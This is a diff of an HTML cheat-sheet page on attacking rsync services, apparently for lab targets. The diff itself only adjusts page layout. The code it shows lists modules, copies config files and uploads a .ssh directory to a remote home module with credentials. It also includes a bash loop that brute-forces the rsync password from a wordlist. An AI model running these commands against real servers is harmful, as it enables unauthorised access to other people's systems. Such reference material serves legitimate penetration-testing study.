@@ -190,6 +190,7 @@
 
 <div class="content"><hr>
 <h3 id="basic-commands">Basic Commands</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List directory (&#39;/&#39;)</span>
 </span></span><span class="line"><span class="cl">rsync --list-only -a rsync://10.10.11.10/
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List directory (&#39;/&#39;) with ipv6</span>
@@ -204,10 +205,15 @@
 </span></span><span class="line"><span class="cl">rsync -a rsync://10.10.11.10/etc/rsync* .
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy files recusively to remote (With Creds)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RSYNC_PASSWORD</span><span class="o">=</span>&lt;PASSWORD&gt;<span class="p">;</span> rsync -aR .ssh/ rsync://&lt;USER&gt;@10.10.11.10/home_user/
-</span></span></code></pre></div><h3 id="bruteforce-rsync-password">Bruteforce rsync password</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="bruteforce-rsync-password">Bruteforce rsync password</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get user from /etc/passwd, Get module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)</span>
 </span></span><span class="line"><span class="cl">cat passwords.txt <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> password<span class="p">;</span> <span class="k">do</span> <span class="nb">export</span> <span class="nv">RSYNC_PASSWORD</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="si">}</span><span class="p">;</span> rsync --list-only rsync://user@10.10.11.10/home_user 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -q <span class="s2">&#34;auth failed on module home_user&#34;</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[+] Found: </span><span class="si">${</span><span class="nv">RSYNC_PASSWORD</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> break<span class="p">;</span> <span class="o">}</span> <span class="k">done</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
